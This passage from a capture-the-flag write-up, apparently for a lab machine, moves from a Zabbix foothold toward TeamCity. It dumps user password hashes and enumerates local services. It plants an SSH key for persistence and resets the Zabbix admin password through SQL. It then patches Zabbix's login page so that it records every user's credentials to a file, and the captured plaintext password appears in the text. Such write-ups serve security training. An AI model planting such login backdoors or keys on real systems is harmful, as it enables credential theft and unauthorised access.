|      3 | Frank    | Frank  |               | $2y$10$9WT5xXnxSfuFWHf5iJc.yeeHXbGkrU0S/M2LagY.8XRX7EZmh.kbS |     |         0 | 0          | default | 30s     | default |              0 |            |             0 |            50 | default  |      2 |            NULL |              0 |
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+-----------------+----------------+
3 rows in set (0.00 sec)
```

I can dump these hashes to `hashcat`, but they don’t crack with `rockyou.txt`.

check the port

```
[zabbix_cmd]>>:  ss -tlap 
State      Recv-Q Send-Q      Local Address:Port                 Peer Address:Port          Process                                                                                                                                                                                           
LISTEN     0      4096              0.0.0.0:zabbix-agent              0.0.0.0:*              users:(("zabbix_agentd",pid=704,fd=4),("zabbix_agentd",pid=703,fd=4),("zabbix_agentd",pid=701,fd=4),("zabbix_agentd",pid=700,fd=4),("zabbix_agentd",pid=699,fd=4),("zabbix_agentd",pid=686,fd=4))
LISTEN     0      4096              0.0.0.0:zabbix-trapper            0.0.0.0:*                                                                                                                                                                                                               
LISTEN     0      151             127.0.0.1:mysql                     0.0.0.0:*                                                                                                                                                                                                               
LISTEN     0      4096        127.0.0.53%lo:domain                    0.0.0.0:*                                                                                                                                                                                                               
LISTEN     0      128               0.0.0.0:ssh                       0.0.0.0:*                                                                                                                                                                                                               
LISTEN     0      511               0.0.0.0:http                      0.0.0.0:*                                                                                                                                                                                                               
LISTEN     0      70              127.0.0.1:33060                     0.0.0.0:*                                                                                                                                                                                                               
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:54648                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:46422                   127.0.0.1:zabbix-agent                                                                                                                                                                                                    
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:46400                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:38148                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:53526                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:54928                                                                                                                                                                                                           
FIN-WAIT-2 0      0          10.129.234.163:http                   10.10.16.6:58526                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:54618                                                                                                                                                                                                           
FIN-WAIT-2 0      0          10.129.234.163:http                   10.10.16.6:58548                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:53644                                                                                                                                                                                                           
TIME-WAIT  0      0          10.129.234.163:http                   10.10.16.6:59390                                                                                                                                                                                                           
ESTAB      0      0               127.0.0.1:zabbix-trapper          127.0.0.1:58676          users:(("ss",pid=18006,fd=18),("sh",pid=18005,fd=18))                                                                                                                                            
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:46444                                                                                                                                                                                                           
LAST-ACK   0      1          10.129.234.163:http                   10.10.16.6:45974                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:38120                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:54626                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:35346                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:45678                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:57110                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:60316                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:45680                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:58666                                                                                                                                                                                                           
ESTAB      0      0               127.0.0.1:58676                   127.0.0.1:zabbix-trapper                                                                                                                                                                                                  
TIME-WAIT  0      0               127.0.0.1:43156                   127.0.0.1:zabbix-trapper                                                                                                                                                                                                  
SYN-SENT   0      1          10.129.234.163:58594             169.254.169.254:http                                                                                                                                                                                                            
ESTAB      0      0               127.0.0.1:mysql                   127.0.0.1:54498                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:38158                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:42162                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:46388                                                                                                                                                                                                           
ESTAB      0      0               127.0.0.1:mysql                   127.0.0.1:54510                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:38108                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:43146                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:42154                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:57092                   127.0.0.1:zabbix-agent                                                                                                                                                                                                    
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:43154                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:38144                                                                                                                                                                                                           
ESTAB      0      0               127.0.0.1:mysql                   127.0.0.1:54476                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:54620                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:46436                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:42134                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:57106                                                                                                                                                                                                           
FIN-WAIT-2 0      0          10.129.234.163:http                   10.10.16.6:58560                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:45670                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:45060                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:35340                   127.0.0.1:zabbix-agent                                                                                                                                                                                                    
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:38100                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:45074                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:42138                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:46410                                                                                                                                                                                                           
ESTAB      0      0               127.0.0.1:mysql                   127.0.0.1:51970                                                                                                                                                                                                           
ESTAB      0      0               127.0.0.1:mysql                   127.0.0.1:45448                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:35354                   127.0.0.1:http                                                                                                                                                                                                            
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:45682                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:53666                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:38136                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:57114                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:54922                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:54640                                                                                                                                                                                                           
ESTAB      0      0          10.129.234.163:http                   10.10.16.6:45976                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:http                    127.0.0.1:55798                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:40848                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:53652                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:46440                                                                                                                                                                                                           
SYN-SENT   0      1          10.129.234.163:51170             169.254.169.254:http                                                                                                                                                                                                            
ESTAB      0      0               127.0.0.1:mysql                   127.0.0.1:37852                                                                                                                                                                                                           
TIME-WAIT  0      0          10.129.234.163:http                   10.10.16.6:59410                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:38160                                                                                                                                                                                                           
FIN-WAIT-2 0      0          10.129.234.163:http                   10.10.16.6:58536                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:60320                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:42176                   127.0.0.1:zabbix-agent                                                                                                                                                                                                    
TIME-WAIT  0      0               127.0.0.1:zabbix-agent            127.0.0.1:42136                                                                                                                                                                                                           
FIN-WAIT-2 0      0          10.129.234.163:http                   10.10.16.6:53262                                                                                                                                                                                                           
TIME-WAIT  0      0               127.0.0.1:zabbix-trapper          127.0.0.1:53632                                                                                                                                                                                                           
LISTEN     0      100    [::ffff:127.0.0.1]:8111                            *:*                                                                                                                                                                                                               
LISTEN     0      1      [::ffff:127.0.0.1]:8105                            *:*                                                                                                                                                                                                               
LISTEN     0      128                  [::]:ssh                          [::]:*                                                                                                                                                                                                               
LISTEN     0      50     [::ffff:127.0.0.1]:9090                            *:*                                                                                                                                                                                                               
LISTEN     0      50     [::ffff:127.0.0.1]:55896                           *:*                                                                                                                                                                                                               
LISTEN     0      50                      *:44005                           *:*                                                                                                                                                                                                               
ESTAB      0      0      [::ffff:127.0.0.1]:8111           [::ffff:127.0.0.1]:48823                                                                                                                                                                                                           
CLOSE-WAIT 1      0      [::ffff:127.0.0.1]:57359          [::ffff:127.0.0.1]:8111                                                                                                                                                                                                            
ESTAB      0      0      [::ffff:127.0.0.1]:45448          [::ffff:127.0.0.1]:mysql                                                                                                                                                                                                           
ESTAB      0      0      [::ffff:127.0.0.1]:54510          [::ffff:127.0.0.1]:mysql                                                                                                                                                                                                           
ESTAB      0      0      [::ffff:127.0.0.1]:54476          [::ffff:127.0.0.1]:mysql                                                                                                                                                                                                           
ESTAB      0      0      [::ffff:127.0.0.1]:54498          [::ffff:127.0.0.1]:mysql                                                                                                                                                                                                           
ESTAB      0      0      [::ffff:127.0.0.1]:37852          [::ffff:127.0.0.1]:mysql                                                                                                                                                                                                           
ESTAB      0      0      [::ffff:127.0.0.1]:48823          [::ffff:127.0.0.1]:8111                                                                                                                                                                                                            
ESTAB      0      0      [::ffff:127.0.0.1]:51970          [::ffff:127.0.0.1]:mysql                                                                                                                                                                                                           

[zabbix_cmd]>>:   

```

```
[zabbix_cmd]>>:  curl http://127.0.0.1:8111 -v
*   Trying 127.0.0.1:8111...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 127.0.0.1 (127.0.0.1) port 8111 (#0)
> GET / HTTP/1.1
> Host: 127.0.0.1:8111
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 
< TeamCity-Node-Id: MAIN_SERVER
< WWW-Authenticate: Basic realm="TeamCity"
< WWW-Authenticate: Bearer realm="TeamCity"
< X-Content-Type-Options: nosniff
< Content-Type: text/plain;charset=UTF-8
< Transfer-Encoding: chunked
< Date: Sat, 28 Mar 2026 06:24:24 GMT
< 
{ [77 bytes data]
100    66    0    66    0     0   9489      0 --:--:-- --:--:-- --:--:-- 13200
* Connection #0 to host 127.0.0.1 left intact
Authentication required
To login manually go to "/login.html" page

```

```
[zabbix_cmd]>>:  curl http://127.0.0.1:8105 -v
*   Trying 127.0.0.1:8105...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 127.0.0.1 (127.0.0.1) port 8105 (#0)
> GET / HTTP/1.1
> Host: 127.0.0.1:8105
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Recv failure: Connection reset by peer
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
* Closing connection 0
curl: (56) Recv failure: Connection reset by peer
```

```
[zabbix_cmd]>>:  curl http://127.0.0.1:9090 -v
*   Trying 127.0.0.1:9090...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 127.0.0.1 (127.0.0.1) port 9090 (#0)
> GET / HTTP/1.1
> Host: 127.0.0.1:9090
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 400 Bad Request
< Server: Apache XML-RPC 1.0
* no chunk, no close, no size. Assume close to signal end
< 
{ [39 bytes data]
100    39    0    39    0     0   5960      0 --:--:-- --:--:-- --:--:--  7800
* Closing connection 0
Method GET not implemented (try POST)


```

make the ssh tunnel

```
➜  CVE-2024-22120-RCE git:(main) ✗ ssh-keygen -t ed25519 -C "haydon@kali-$(date +%Y%m%d)"
Generating public/private ed25519 key pair.
Enter file in which to save the key (/root/.ssh/id_ed25519): yes
Enter passphrase for "yes" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in yes
Your public key has been saved in yes.pub
The key fingerprint is:
SHA256:LBlR0wyD0w7VrbODf8lfs4k7kwxt3wrJ9O/Kg8XO054 haydon@kali-20260328
The key's randomart image is:
+--[ED25519 256]--+
|      .=*= .     |
|      +..o+ .    |
|      .+   .     |
|       +. o      |
|      o S. oo.   |
|       .. o+ =o  |
|         . oB*+oo|
|          . =B*+B|
|           . +OE+|
+----[SHA256]-----+
➜  CVE-2024-22120-RCE git:(main) ✗ 
➜  CVE-2024-22120-RCE git:(main) ✗ cd ~/.ssh    
➜  .ssh ls
agent  id_ed25519  id_ed25519.pub  known_hosts  known_hosts.old
➜  .ssh cat id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPCbObAUmoA91WRDGYyio/t4ly+xYubKzOGTCV+bZieZ haydon@kali-20260227
➜  .ssh 
```

```
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPCbObAUmoA91WRDGYyio/t4ly+xYubKzOGTCV+bZieZ haydon@kali-20260227" > authorized_keys
```

```
$ cd /var/lib/zabbix
$ ls
user.txt
$ chmod 700 .ssh/
$ cd .ssh       
$ ls
$ pwd
/var/lib/zabbix/.ssh
$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPCbObAUmoA91WRDGYyio/t4ly+xYubKzOGTCV+bZieZ haydon@kali-20260227" > authorized_keys
$ 
```

Now I can SSH, but the zabbix user’s shell in passwd is set to /nologin:

```
➜  .ssh ssh -i ~/.ssh/id_ed25519 zabbix@10.129.234.163 
The authenticity of host '10.129.234.163 (10.129.234.163)' can't be established.
ED25519 key fingerprint is: SHA256:JDOGxd+Q6ONAdpL+ofsWbYXtuRCe30lTgg7EiA3nMMg
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.234.163' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1039-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Mar 28 06:41:25 UTC 2026

  System load:  0.62               Processes:             224
  Usage of /:   84.9% of 11.45GB   Users logged in:       0
  Memory usage: 68%                IPv4 address for eth0: 10.129.234.163
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

This account is currently not available.
Connection to 10.129.234.163 closed.

```

install the teamcity

```
➜  /opt wget https://download.jetbrains.com/teamcity/TeamCity-2022.10.1.tar.gz
--2026-03-28 02:46:26--  https://download.jetbrains.com/teamcity/TeamCity-2022.10.1.tar.gz
Resolving download.jetbrains.com (download.jetbrains.com)... 54.230.71.66, 54.230.71.79, 54.230.71.100, ...
Connecting to download.jetbrains.com (download.jetbrains.com)|54.230.71.66|:443... connected.
HTTP request sent, awaiting response... 302 Moved Temporarily
Location: https://download-cdn.jetbrains.com/teamcity/TeamCity-2022.10.1.tar.gz [following]
--2026-03-28 02:46:26--  https://download-cdn.jetbrains.com/teamcity/TeamCity-2022.10.1.tar.gz
Resolving download-cdn.jetbrains.com (download-cdn.jetbrains.com)... 13.35.186.91, 13.35.186.47, 13.35.186.124, ...
Connecting to download-cdn.jetbrains.com (download-cdn.jetbrains.com)|13.35.186.91|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2062035056 (1.9G) [binary/octet-stream]
Saving to: ‘TeamCity-2022.10.1.tar.gz’

TeamCity-2022.10.1.tar.gz                        100%[=========================================================================================================>]   1.92G  12.1MB/s    in 3m 31s  

2026-03-28 02:49:59 (9.31 MB/s) - ‘TeamCity-2022.10.1.tar.gz’ saved [2062035056/2062035056]

➜  /opt tar xfz TeamCity-2022.10.1.tar.gz
➜  /opt TeamCity/bin/runAll.sh start
Spawning TeamCity restarter in separate process
TeamCity restarter running with PID 58223
Starting TeamCity build agent...

Java executable of version 1.8 is not found:
- Java executable is not found under the specified directories: '', '', '/opt/TeamCity/buildAgent/bin/../jre', '/opt/TeamCity/buildAgent/bin/../../jre'
- Neither the JAVA_HOME nor the JRE_HOME environment variable is defined
- Java executable is not found in the default locations
- Java executable is not found in the directories listed in the PATH environment variable

Please make sure either JAVA_HOME or JRE_HOME environment variable is defined and is pointing to the root directory of the valid Java (JRE) installation
Please note that all Java versions starting from 12 were skipped because stable operation on these Java versions is not guaranteed

Environment variable FJ_DEBUG can be set to enable debug output

Java not found. Cannot start TeamCity agent. Please ensure JDK or JRE is installed and JAVA_HOME environment variable points to it.
➜  /opt apt install java-common -y
java-common is already the newest version (0.76).
java-common set to manually installed.
The following packages were automatically installed and are no longer required:
  curlftpfs                libdisplay-info2          libmozjs-128-0          libsqlcipher1                   medusa                   python3-pyexploitdb     python3-wapiti-swagger  urlscan
  dnsmap                   libgav1-1                 libmpeg2encpp-2.1-0t64  libstd-rust-1.88                pocketsphinx-en-us       python3-pyfiglet        python3-xlrd            wapiti
  figlet                   libgdal37                 libmplex2-2.1-0t64      libswscale8                     python3-aiocache         python3-pyshodan        python3-yaswfp
  finger                   libgirepository-1.0-1     libobjc-14-dev          libvdpau-va-gl1                 python3-aiomcache        python3-pysmi           rsh-redone-client
  gir1.2-girepository-2.0  libgnome-desktop-3-20t64  libpocketsphinx3        libwireshark18                  python3-browser-cookie3  python3-qasync          smtp-user-enum
  libarmadillo14           libgnome-rr-4-2t64        libpostproc58           libwiretap15                    python3-git              python3-serial-asyncio  sparta-scripts
  libavfilter10            libgpgme11t64             libradare2-5.0.0t64     libwsutil16                     python3-gitdb            python3-smmap           tini
  libavformat61            libgpgmepp6t64            libsmb2-6               linux-image-6.12.38+kali-amd64  python3-httpx-ntlm       python3-tld             toilet-fonts
  libconfig-inifiles-perl  libmjpegutils-2.1-0t64    libsphinxbase3t64       lld-19                          python3-jeepney          python3-wapiti-arsenic  unicornscan
Use 'apt autoremove' to remove them.

Summary:
  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 1708
➜  /opt wget https://corretto.aws/downloads/latest/amazon-corretto-11-x64-linux-jdk.deb
--2026-03-28 02:53:32--  https://corretto.aws/downloads/latest/amazon-corretto-11-x64-linux-jdk.deb
Resolving corretto.aws (corretto.aws)... 13.35.186.58, 13.35.186.123, 13.35.186.41, ...
Connecting to corretto.aws (corretto.aws)|13.35.186.58|:443... connected.
HTTP request sent, awaiting response... 302 Moved Temporarily
Location: /downloads/resources/11.0.30.7.1/java-11-amazon-corretto-jdk_11.0.30.7-1_amd64.deb [following]
--2026-03-28 02:53:35--  https://corretto.aws/downloads/resources/11.0.30.7.1/java-11-amazon-corretto-jdk_11.0.30.7-1_amd64.deb
Reusing existing connection to corretto.aws:443.
HTTP request sent, awaiting response... 200 OK
Length: 195465504 (186M) [binary/octet-stream]
Saving to: ‘amazon-corretto-11-x64-linux-jdk.deb’

amazon-corretto-11-x64-linux-jdk.deb             100%[=========================================================================================================>] 186.41M  12.6MB/s    in 18s     

2026-03-28 02:53:53 (10.4 MB/s) - ‘amazon-corretto-11-x64-linux-jdk.deb’ saved [195465504/195465504]

➜  /opt dpkg --install amazon-corretto-11-x64-linux-jdk.deb
Selecting previously unselected package java-11-amazon-corretto-jdk:amd64.
(Reading database ... 609112 files and directories currently installed.)
Preparing to unpack amazon-corretto-11-x64-linux-jdk.deb ...
Unpacking java-11-amazon-corretto-jdk:amd64 (1:11.0.30.7-1) ...
Setting up java-11-amazon-corretto-jdk:amd64 (1:11.0.30.7-1) ...
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/java to provide /usr/bin/java (java) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/keytool to provide /usr/bin/keytool (keytool) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/rmid to provide /usr/bin/rmid (rmid) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/rmiregistry to provide /usr/bin/rmiregistry (rmiregistry) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/jjs to provide /usr/bin/jjs (jjs) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/pack200 to provide /usr/bin/pack200 (pack200) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/unpack200 to provide /usr/bin/unpack200 (unpack200) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/javac to provide /usr/bin/javac (javac) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/jaotc to provide /usr/bin/jaotc (jaotc) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/jlink to provide /usr/bin/jlink (jlink) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/jmod to provide /usr/bin/jmod (jmod) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/jhsdb to provide /usr/bin/jhsdb (jhsdb) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/jar to provide /usr/bin/jar (jar) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/jarsigner to provide /usr/bin/jarsigner (jarsigner) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/javadoc to provide /usr/bin/javadoc (javadoc) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/javap to provide /usr/bin/javap (javap) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/jcmd to provide /usr/bin/jcmd (jcmd) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/jconsole to provide /usr/bin/jconsole (jconsole) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/jdb to provide /usr/bin/jdb (jdb) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/jdeps to provide /usr/bin/jdeps (jdeps) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/jdeprscan to provide /usr/bin/jdeprscan (jdeprscan) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/jimage to provide /usr/bin/jimage (jimage) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/jinfo to provide /usr/bin/jinfo (jinfo) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/jmap to provide /usr/bin/jmap (jmap) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/jps to provide /usr/bin/jps (jps) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/jrunscript to provide /usr/bin/jrunscript (jrunscript) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/jshell to provide /usr/bin/jshell (jshell) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/jstack to provide /usr/bin/jstack (jstack) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/jstat to provide /usr/bin/jstat (jstat) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/jstatd to provide /usr/bin/jstatd (jstatd) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/rmic to provide /usr/bin/rmic (rmic) in auto mode
update-alternatives: using /usr/lib/jvm/java-11-amazon-corretto/bin/serialver to provide /usr/bin/serialver (serialver) in auto mode
➜  /opt java -version
openjdk version "11.0.30" 2026-01-20 LTS
OpenJDK Runtime Environment Corretto-11.0.30.7.1 (build 11.0.30+7-LTS)
OpenJDK 64-Bit Server VM Corretto-11.0.30.7.1 (build 11.0.30+7-LTS, mixed mode)
➜  /opt TeamCity/bin/runAll.sh start                                                   
Spawning TeamCity restarter in separate process
TeamCity restarter running with PID 60280
Starting TeamCity build agent...
Java executable is found: '/usr/lib/jvm/java-11-amazon-corretto/bin/java'
Starting TeamCity Build Agent Launcher...
Agent home directory is /opt/TeamCity/buildAgent
Done [61282], see log at /opt/TeamCity/buildAgent/logs/teamcity-agent.log
➜  /opt 

```

![Pasted image 20260328145539.png](/ob/Pasted%20image%2020260328145539.png)

#### Get Access via Database Manipulation

The [Zabbix docs](https://www.zabbix.com/documentation/current/en/manual/web_interface/password_reset) show how to reset the admin password to “zabbix” with a database query:

```
UPDATE users SET passwd = '$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username = 'Admin';
```

I can run this from the shell:

```
mysql> UPDATE users SET passwd = '$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username = 'Admin';
Query OK, 1 row affected (0.01 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

And then login (making sure to use “Admin” and not “admin”):

[![image-20251004171531179](https://0xdf.gitlab.io/img/image-20251004171531179.png)*Click for full size image*](https://0xdf.gitlab.io/img/image-20251004171531179.png)

#### Audit Logs

On the audit logs, I’ll notice that Frank is logging in. Updating the filters to just show Frank, it shows they are logging in every minute:

[![image-20251004171736833](https://0xdf.gitlab.io/img/image-20251004171736833.png)*Click for full size image*](https://0xdf.gitlab.io/img/image-20251004171736833.png)

### Poison Zabbix Login

Looking at my Burp Proxy HTTP history, the login sends a POST to `/index.php`. I’ll find `index.php` in `/usr/share/zabbix`. The login code looks like it’s around line 70:

```
zabbix@watcher:/usr/share/zabbix$ cat index.php | grep -n login
37:     'autologin' =>  [T_ZBX_INT, O_OPT, null,        null,   null],
57:$autologin = hasRequest('enter') ? getRequest('autologin', 0) : getRequest('autologin', 1);
70:// login via form
71:if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
74:     if (CWebUser::$data['autologin'] != $autologin) {
77:                     'autologin' => $autologin
91:echo (new CView('general.login', [
92:     'http_login_url' => (CAuthenticationHelper::get(CAuthenticationHelper::HTTP_AUTH_ENABLED) == ZBX_AUTH_HTTP_ENABLED)
95:     'saml_login_url' => (CAuthenticationHelper::get(CAuthenticationHelper::SAML_AUTH_ENABLED) == ZBX_AUTH_SAML_ENABLED)
98:     'guest_login_url' => CWebUser::isGuestAllowed() ? (new CUrl())->setArgument('enter', ZBX_GUEST_USER) : '',
99:     'autologin' => $autologin == 1,
```

I found the easiest way to modify the file over this reverse shell is to copy all the text and create a file on my host. Now I’ll edit it, adding a few lines:

```
// login via form
if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
        $user = $_POST['name'] ?? '??';
        $password = $_POST['password'] ?? '??';
        $f = fopen('/dev/shm/0xdf.txt', 'a+');
        fputs($f, "{$user}:{$password}\n");
        fclose($f);

        CSessionHelper::set('sessionid', CWebUser::$data['sessionid']);
```

Users can login as normal, but their creds will be recorded to `/dev/shm/0xdf.txt`. Now I’ll serve this file with my Python HTTP server, and upload it:

```
zabbix@watcher:/usr/share/zabbix$ cp index.php{,.bak}   
zabbix@watcher:/usr/share/zabbix$ curl 10.10.15.1/index.php -o index.php
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4692  100  4692    0     0  91465      0 --:--:-- --:--:-- --:--:-- 92000
```

Soon, there’s an `0xdf.txt` in `/dev/shm`:

```
zabbix@watcher:/usr/share/zabbix$ cat /dev/shm/0xdf.txt 
Frank:R%)3S7^Hf4TBobb(gVVs
```

![Pasted image 20260328150345.png](/ob/Pasted%20image%2020260328150345.png)

TeamCity is a CICD build platform, and frank seems to have admin access. I should be able to create a build stage that executes whatever code I want. I’ll click “Create project…”. On the next page, I’ll click “Manually”:

![Pasted image 20260328150923.png](/ob/Pasted%20image%2020260328150923.png)

![Pasted image 20260328152141.png](/ob/Pasted%20image%2020260328152141.png)

